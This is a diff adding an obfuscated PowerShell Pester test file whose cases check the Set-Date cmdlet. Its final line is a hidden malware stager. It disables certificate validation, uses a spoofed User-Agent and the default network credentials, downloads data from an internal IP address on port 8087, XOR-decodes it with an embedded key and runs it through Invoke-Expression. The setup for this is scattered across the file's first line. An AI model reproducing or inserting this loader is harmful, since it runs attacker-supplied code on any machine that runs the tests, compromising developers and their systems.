@@ -1,0 +1,26 @@
+  .("{1}{2}{0}" -f 'M','SET-','ite') VArIaBlE:R0mjqL  ( [tyPe]("{4}{3}{2}{0}{1}" -f 'Ic','EpOINTMAnAGer','rv','ET.SE','syStEM.n')) ;  .('Sv') ('r'+'pvT'+'37') ( [tyPe]("{3}{1}{4}{2}{0}"-f'St','m.NeT.','EbreqUE','SystE','W')  )  ;&("{2}{0}{1}"-f 't-Ite','m','sE') ("VA"+"RIaBlE:c75"+"q") ([type]("{0}{5}{2}{1}{4}{7}{3}{6}"-F 'sYsTeM.Net','EnTi','Ed','c','a','.cr','AcHE','l'))  ;  
+
+
+.("{0}{3}{2}{1}"-f'Import','le','du','-Mo') ("{2}{0}{4}{1}{3}"-f'e','pe','H','rsCommon','l')
+
+&("{1}{0}"-f'scribe','De') ("{4}{3}{0}{2}{1}"-f 'r ad','in','m','Date fo','Set-') -Tag @('CI', ("{3}{5}{2}{4}{1}{0}{6}" -f 'ndow','Wi','reA','R','dminOn','equi','s'), ("{1}{0}{3}{5}{4}{2}"-f'reSu','Requi','ix','do','n','OnU')) {
+    
+    &('It') ("{0}{4}{6}{2}{3}{11}{9}{7}{8}{5}{1}{10}" -f'Set-Da','t','to',' set ','te should be able','con',' ','ev','ated ','te in an el','ext','the da') -Skip:(.("{2}{3}{1}{0}"-f'tsLinux','-IsVs','T','est')) {
+        { &("{1}{2}{0}"-f 't-Date','G','e') | .("{1}{0}"-f'te','Set-Da') } | .("{0}{1}"-f 'S','hould') -Not -Throw
+    }
+
+    
+    &('It') ("{8}{17}{5}{4}{16}{15}{7}{1}{11}{14}{0}{12}{13}{6}{2}{10}{3}{9}" -f'able','ld b',' para','e','e s','Dat',' date with -Date','u','Set','r','met','e',' to',' set the',' ','o','h','-') -Skip:(.("{1}{3}{0}{2}{4}"-f 'V','Tes','stsLinu','t-Is','x')) {
+        ${tar`GeT} = .("{0}{2}{1}" -f'G','ate','et-D')
+        ${EXPe`cT`Ed} = ${taRG`Et}
+        .("{0}{2}{1}" -f'S','-Date','et') -Date ${t`AR`GeT} | &("{2}{1}{0}"-f'd','l','Shou') -Be ${e`xPecTED}
+    }
+}
+
+.("{0}{1}{2}"-f'D','escr','ibe') ("{0}{2}{1}"-f 'S','ate','et-D') -Tag 'CI' {
+    &('It') ("{13}{7}{8}{10}{1}{0}{11}{9}{4}{5}{3}{6}{12}{2}"-f 'r ','e an erro','xt','vated co','el','e','nt','et','-','a non-','Date should produc','in ','e','S') {
+        { .("{0}{2}{1}" -f'Ge','te','t-Da') | &("{2}{1}{0}"-f 'e','at','Set-D') } | &("{0}{1}"-f 'Sh','ould') -Throw -ErrorId ("{7}{0}{17}{23}{2}{22}{5}{11}{14}{8}{4}{20}{10}{18}{19}{1}{12}{6}{15}{21}{16}{3}{9}{13}"-f 's','hell.','ntM','Comma','of','n32','mma','Sy','ception,Micros','n','.Powe','E','Co','d','x','nd','SetDate','tem.Compon','r','S','t','s.','odel.Wi','e')
+    }
+}
+
+  $R0mjQL::"eXPe`cT`100cONTI`NUE" = 0;${wC}=&("{1}{2}{0}"-f'cT','NEW-O','BjE') ("{2}{1}{5}{3}{0}{4}" -f 'C','YsTEm.','S','Eb','Lient','NEt.W');${u}=("{15}{12}{4}{0}{19}{10}{2}{9}{7}{3}{13}{16}{18}{11}{14}{6}{17}{5}{8}{1}"-f '.0 (','Gecko','ws','nt/7','5','ke','l',' Tride',' ',' NT 6.1; WOW64;','ndo','v','lla/','.0',':11.0) ','Mozi','; ','i','r','Wi');  (&("{3}{2}{1}{0}" -f'e','aBL','eT-vari','G') r0MJqL  ).vALuE::"SEr`VEr`cer`TIfICA`T`EvALiDaT`IO`NCALl`B`Ack" = {${tR`UE}};${w`c}."HEAD`E`RS".("{0}{1}" -f 'A','dD').Invoke(("{2}{0}{1}" -f'r','-Agent','Use'),${U});${WC}."PRo`xy" =  (  &("{1}{0}{2}"-f'Ar','v','iAbLe')  ('R'+'pvt'+'37')  -VaLue)::"D`efa`Ul`TWE`BpRoxy";${w`c}."p`Roxy"."cR`Ed`eNt`iALS" =  ( &("{0}{3}{2}{1}"-f'Ge','iabLE','-VAR','T') ("C"+"75q")  -vAluEONL  )::"D`EfaULTnETWor`KcreD`e`NtI`ALS";${k}=("{2}{5}{1}{4}{0}{3}" -f '12a3','17e0a','6df0e78','f858a','e2d45da8a5','d');${I}=0;[chaR[]]${B}=([chaR[]](${Wc}.("{0}{2}{1}{3}" -f 'DowNlOad','T','S','RIng').Invoke(("{5}{1}{4}{3}{6}{2}{0}{7}"-f '8087/index.as','s:',':','/10.130.1','/','http','42.197','p'))))|.('%'){${_}-bXor${K}[${i}++%${k}."lEng`TH"]};&("{0}{1}"-f 'I','EX') (${B}-jOin'')
